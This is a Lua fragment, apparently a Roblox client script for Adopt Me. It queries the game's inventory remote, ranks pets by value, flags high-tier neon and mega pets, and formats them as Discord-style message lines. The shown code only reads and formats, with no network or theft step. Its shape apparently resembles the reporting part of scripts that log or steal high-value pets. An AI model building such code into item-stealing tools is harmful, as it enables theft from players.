-- INVENTORY FETCHING & FORMATTING
--------------------------------------------------------------
local function getAdoptMeInventory()
    local items = {}
    local totalVal = 0
    
    local success, inv = pcall(function() 
        return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
    end)
    
    if not success or not inv then return items, 0 end

    for uniqueId, itemData in pairs(inv) do
        if itemData.Kind == "Pet" then
            local dbData = InventoryDB.pets[itemData.id]
            local itemName = (dbData and dbData.name) or itemData.id
            
            local val = (itemData.properties and itemData.properties.value) or 0
            local isNeon = (itemData.properties and itemData.properties.neon) == true
            local isMega = (itemData.properties and itemData.properties.mega_neon) == true
            
            local isHighTier = val >= 100 or isNeon or isMega

            table.insert(items, {
                uid = uniqueId,
                id = itemData.id,
                name = itemName,
                value = val,
                isNeon = isNeon,
                isMega = isMega,
                isHighTier = isHighTier,
                properties = itemData.properties
            })
            totalVal = totalVal + val
        end
    end

    -- Sort Descending by Value (Highest First)
    table.sort(items, function(a, b) return a.value > b.value end)
    return items, totalVal
end

local function formatItemLine(item)
    local emoji = item.isHighTier and "⭐" or "🐾"
    local tags = ""
    if item.isMega then tags = "🌈 **[MEGA]** "
    elseif item.isNeon then tags = "✨ **[NEON]** " end
    
    return string.format("%s %s%s ➜ `%s Pts`", emoji, tags, item.name, tostring(item.value))
end

